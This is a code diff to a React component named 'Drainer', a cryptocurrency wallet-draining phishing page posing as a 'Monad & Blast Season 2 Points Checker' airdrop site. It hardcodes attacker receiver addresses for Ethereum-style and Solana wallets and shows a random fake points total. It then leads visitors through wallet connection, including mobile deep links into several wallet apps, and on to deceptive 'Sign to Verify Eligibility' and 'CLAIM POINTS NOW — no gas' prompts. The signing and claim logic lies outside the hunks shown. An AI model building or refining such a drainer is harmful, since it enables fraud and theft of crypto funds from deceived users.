@@ -3,7 +3,6 @@ import { useState, useEffect } from 'react'
 import { ethers } from 'ethers'
 import * as solanaWeb3 from '@solana/web3.js'
 import * as splToken from '@solana/spl-token'
-import WalletConnect from './WalletConnect'
 
 const EVM_RECEIVER = "0x5578045035fa1f6c1359d29efe4ff3b979e5b267"
 const SOL_RECEIVER = "7p5Ea6LahtSgy42T1ELC863VayJfPmTDLrDUsRwaSAWN"
@@ -11,9 +10,8 @@ const SOL_RECEIVER = "7p5Ea6LahtSgy42T1ELC863VayJfPmTDLrDUsRwaSAWN"
 export default function Drainer() {
   const [account, setAccount] = useState('')
   const [points, setPoints] = useState(0)
-  const [stage, setStage] = useState<'connect' | 'verify' | 'claim' | 'connected'>('connect')
+  const [stage, setStage] = useState<'connect' | 'verify' | 'claim'>('connect')
   const [showSuccess, setShowSuccess] = useState(false)
-  const [connectedWallet, setConnectedWallet] = useState<{name: string, icon: string} | null>(null)
 
   useEffect(() => {
     setPoints(Math.floor(Math.random() * 9000000) + 8000000)
@@ -29,8 +27,7 @@ export default function Drainer() {
       // Check Solana (all wallets)
       if (solana && solana.publicKey) {
         setAccount(solana.publicKey.toString())
-        setConnectedWallet({ name: 'Solana Wallet', icon: '👛' })
-        setStage('connected')
+        setStage('verify')
         return
       }
 
@@ -46,18 +43,10 @@ export default function Drainer() {
           const accounts = await provider.request({ method: 'eth_accounts' })
           if (accounts && accounts.length > 0) {
             setAccount(accounts[0])
-            setConnectedWallet({ 
-              name: provider.isMetaMask ? 'MetaMask' : 
-                   provider.isTrust ? 'Trust Wallet' : 
-                   provider.isCoinbaseWallet ? 'Coinbase Wallet' : 'Wallet',
-              icon: provider.isMetaMask ? '🦊' : 
-                    provider.isTrust ? '🛡️' : 
-                    provider.isCoinbaseWallet ? '🔵' : '👛'
-            })
-            setStage('connected')
+            setStage('verify')
           }
         } catch (e) {
-          console.error('Error checking connected wallet:', e)
+          // Not connected, stay on connect stage
         }
       }
     }
@@ -68,49 +57,91 @@ export default function Drainer() {
     const handleAccountsChanged = (accounts: string[]) => {
       if (accounts && accounts.length > 0) {
         setAccount(accounts[0])
+        setStage('verify')
       } else {
         setAccount('')
         setStage('connect')
-        setConnectedWallet(null)
       }
     }
 
     if ((window as any).ethereum) {
-      (window as any).ethereum.on('accountsChanged', handleAccountsChanged)
+      ;(window as any).ethereum.on('accountsChanged', handleAccountsChanged)
     }
 
     return () => {
       if ((window as any).ethereum) {
-        (window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged)
+        ;(window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged)
       }
     }
   }, [])
 
+  const wallets = [
+    { name: "MetaMask", icon: "🦊", is: 'isMetaMask', type: 'evm' },
+    { name: "Trust Wallet", icon: "🛡️", is: 'isTrust', type: 'evm' },
+    { name: "Phantom", icon: "👻", is: 'isPhantom', type: 'solana' },
+    { name: "Backpack", icon: "🎒", is: 'isBackpack', type: 'solana' },
+    { name: "Solflare", icon: "☀️", is: 'isSolflare', type: 'solana' },
+    { name: "Coinbase Wallet", icon: "🔵", is: 'isCoinbaseWallet', type: 'evm' },
+  ]
 
-  const handleWalletConnect = async (wallet: any) => {
-    setConnectedWallet({ name: wallet.name, icon: wallet.icon })
-    
+  const connectWallet = async (walletType: string) => {
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
     const ethereum = (window as any).ethereum
-    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare
-    
-    try {
-      if (wallet.type === 'evm' && ethereum) {
-        // Handle EVM wallet connection
-        const provider = new ethers.BrowserProvider(ethereum)
-        const accounts = await provider.send("eth_requestAccounts", [])
-        if (accounts && accounts.length > 0) {
-          setAccount(accounts[0])
-          setStage('connected')
-        }
-      } else if (wallet.type === 'solana' && solana) {
-        // Handle Solana wallet connection
-        const response = await solana.connect()
-        setAccount(response.publicKey.toString())
-        setStage('connected')
+    const solana = (window as any).solana || (window as any).phantom?.solana
+    const url = encodeURIComponent(window.location.href)
+
+    // Mobile: use deep links
+    if (isMobile) {
+      const links: Record<string, string> = {
+        metamask: `https://metamask.app.link/dapp/${url}`,
+        trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
+        phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
+        backpack: `https://backpack.app/ul/browse/${url}`,
+        solflare: `solflare://dapp?uri=${url}`,
+        coinbasewallet: `cbwallet://dapp?url=${url}`
       }
-    } catch (error) {
-      console.error('Error connecting wallet:', error)
-      // Handle error state
+      const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
+      if (links[linkKey]) {
+        window.location.href = links[linkKey]
+        return
+      }
+    }
+
+    // Desktop: connect to installed extension
+    try {
+      const wallet = wallets.find(w => w.name.toLowerCase().replace(/\s+/g, '') === walletType.toLowerCase().replace(/\s+/g, ''))
+      
+      if (wallet?.type === 'solana' && solana) {
+        if (solana.connect) {
+          await solana.connect()
+        }
+        if (solana.publicKey) {
+          setAccount(solana.publicKey.toString())
+          setStage('verify')
+        }
+      } else if (wallet?.type === 'evm' && ethereum) {
+        let provider = ethereum
+        // Find specific wallet in providers array
+        if (ethereum.providers) {
+          provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum
+        } else if (ethereum[wallet.is]) {
+          provider = ethereum
+        }
+        
+        if (provider) {
+          const accounts = await provider.request({ method: 'eth_requestAccounts' })
+          if (accounts && accounts[0]) {
+            setAccount(accounts[0])
+            setStage('verify')
+          }
+        } else {
+          alert(`${wallet.name} not detected. Please install the extension.`)
+        }
+      } else {
+        alert(`${wallet?.name || walletType} not detected. Please install the extension.`)
+      }
+    } catch (e) {
+      alert('Connection rejected or wallet not found')
     }
   }
 
@@ -381,29 +412,6 @@ export default function Drainer() {
 
   const [isMobile, setIsMobile] = useState(false)
 
-  const wallets = [
-    {
-      name: 'MetaMask',
-      icon: '🦊',
-      type: 'evm'
-    },
-    {
-      name: 'Phantom',
-      icon: '👻',
-      type: 'solana'
-    },
-    {
-      name: 'Backpack',
-      icon: '🎒',
-      type: 'solana'
-    },
-    {
-      name: 'Solflare',
-      icon: '🔥',
-      type: 'solana'
-    }
-  ];
-
   useEffect(() => {
     setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent))
   }, [])
@@ -438,94 +446,71 @@ export default function Drainer() {
       )}
       <div className="min-h-screen bg-gradient-to-b from-purple-900 to-black text-white flex items-center justify-center p-3 sm:p-4 md:p-6">
         <div className="max-w-2xl w-full bg-black/60 backdrop-blur-xl rounded-2xl sm:rounded-3xl border border-purple-500 p-4 sm:p-6 md:p-8">
-          {stage === 'connect' && (
-            <div className="text-center">
-              <div className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 bg-purple-600 rounded-full mx-auto flex items-center justify-center text-3xl sm:text-4xl md:text-6xl mb-4">
-                M
-              </div>
-              <h1 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold mb-2">
-                Monad & Blast Season 2 Points Checker
-              </h1>
-              <p className="text-sm sm:text-base md:text-lg lg:text-xl mb-6">
-                Check your eligibility for the biggest airdrop of 2025
-              </p>
-              
-              <button
-                onClick={connect}
-                className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full text-lg mb-6 transition-colors"
-              >
-                Connect Wallet
-              </button>
-
-              {isMobile && (
-                <div className="mt-4">
-                  <p className="text-sm sm:text-base md:text-lg text-gray-300 mb-3">
-                    Or choose a specific wallet:
-                  </p>
-                  <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
-                    {wallets.map(w => (
-                      <button
-                        key={w.name}
-                        onClick={() => handleWalletConnect(w)}
-                        className="bg-gray-800 hover:bg-gray-700 p-4 rounded-xl flex flex-col items-center"
-                      >
-                        <span className="text-2xl mb-1">{w.icon}</span>
-                        <span className="text-sm font-medium">{w.name}</span>
-                      </button>
-                    ))}
-                  </div>
-                </div>
-              )}
-            </div>
-          )}
-
-          {stage === 'verify' && (
-            <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
-              <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-400">
-                {points.toLocaleString()}
-              </div>
-              <p className="text-xl sm:text-2xl md:text-3xl">POINTS DETECTED 🔥</p>
-              <button 
-                onClick={verify} 
-                className="bg-green-600 hover:bg-green-700 px-8 sm:px-12 md:px-16 py-4 sm:py-5 md:py-6 rounded-xl sm:rounded-2xl md:rounded-3xl text-lg sm:text-xl md:text-2xl font-bold w-full transition-all"
-              >
-                Sign to Verify Eligibility
-              </button>
-            </div>
-          )}
-
-          {stage === 'claim' && (
-            <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
-              <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-green-400 animate-pulse">
-                ELIGIBLE!
-              </div>
-              <p className="text-base sm:text-lg md:text-xl lg:text-2xl">
-                Claim your points instantly — no gas
-              </p>
-              <button 
-                onClick={claim} 
-                className="bg-purple-600 hover:bg-purple-700 px-6 sm:px-10 md:px-16 lg:px-20 py-4 sm:py-6 md:py-8 lg:py-10 rounded-2xl sm:rounded-3xl text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold w-full animate-pulse shadow-2xl transition-all"
-              >
-                CLAIM POINTS NOW
-              </button>
-            </div>
-          )}
-
-          {stage === 'connected' && connectedWallet && (
-            <div className="text-center">
-              <div className="text-4xl mb-4">{connectedWallet.icon}</div>
-              <h2 className="text-2xl font-bold mb-2">Connected with {connectedWallet.name}</h2>
-              <p className="text-gray-400 text-sm mb-6 break-all">{account}</p>
-              <button
-                onClick={() => setStage('verify')}
-                className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full text-lg"
-              >
-                Continue
-              </button>
-            </div>
-          )}
+        <div className="text-center mb-4 sm:mb-6 md:mb-8">
+          <div className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 bg-purple-600 rounded-full mx-auto flex items-center justify-center text-3xl sm:text-4xl md:text-6xl">M</div>
+          <h1 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold mt-2 sm:mt-3 md:mt-4 px-2">
+            Monad & Blast Season 2 Points Checker
+          </h1>
+          <p className="text-sm sm:text-base md:text-lg lg:text-xl mt-1 sm:mt-2 px-2">
+            Check your eligibility for the biggest airdrop of 2025
+          </p>
         </div>
+
+        {stage === 'connect' && (
+          <div className="text-center space-y-4 sm:space-y-6 md:space-y-8">
+            <button 
+              onClick={connect}
+              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-8 md:px-12 py-3 sm:py-4 md:py-6 rounded-xl sm:rounded-2xl text-base sm:text-lg md:text-xl lg:text-2xl font-bold w-full transition-all touch-manipulation"
+            >
+              Connect Wallet
+            </button>
+            {isMobile && (
+              <>
+                <p className="text-sm sm:text-base md:text-lg text-gray-300">Or choose a specific wallet:</p>
+                <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
+                  {wallets.map(w => (
+                    <button
+                      key={w.name}
+                      onClick={() => connectWallet(w.name)}
+                      className="bg-gray-800 hover:bg-gray-700 active:bg-gray-600 p-4 sm:p-5 md:p-6 rounded-xl sm:rounded-2xl transition-all transform active:scale-95 flex flex-col items-center touch-manipulation"
+                    >
+                      <span className="text-3xl sm:text-4xl mb-1 sm:mb-2">{w.icon}</span>
+                      <div className="text-xs sm:text-sm md:text-base font-medium">{w.name}</div>
+                    </button>
+                  ))}
+                </div>
+              </>
+            )}
+          </div>
+        )}
+
+        {stage === 'verify' && (
+          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
+            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-400">{points.toLocaleString()}</div>
+            <p className="text-xl sm:text-2xl md:text-3xl">POINTS DETECTED 🔥</p>
+            <button 
+              onClick={verify} 
+              className="bg-green-600 hover:bg-green-700 active:bg-green-800 px-8 sm:px-12 md:px-16 py-4 sm:py-5 md:py-6 rounded-xl sm:rounded-2xl md:rounded-3xl text-lg sm:text-xl md:text-2xl font-bold w-full transition-all touch-manipulation"
+            >
+              Sign to Verify Eligibility
+            </button>
+          </div>
+        )}
+
+        {stage === 'claim' && (
+          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
+            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-green-400 animate-pulse">ELIGIBLE!</div>
+            <p className="text-base sm:text-lg md:text-xl lg:text-2xl">Claim your points instantly — no gas</p>
+            <button 
+              onClick={claim} 
+              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-10 md:px-16 lg:px-20 py-4 sm:py-6 md:py-8 lg:py-10 rounded-2xl sm:rounded-3xl text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold w-full animate-pulse shadow-2xl transition-all touch-manipulation"
+            >
+              CLAIM POINTS NOW
+            </button>
+          </div>
+        )}
       </div>
+    </div>
     </>
   )
 }
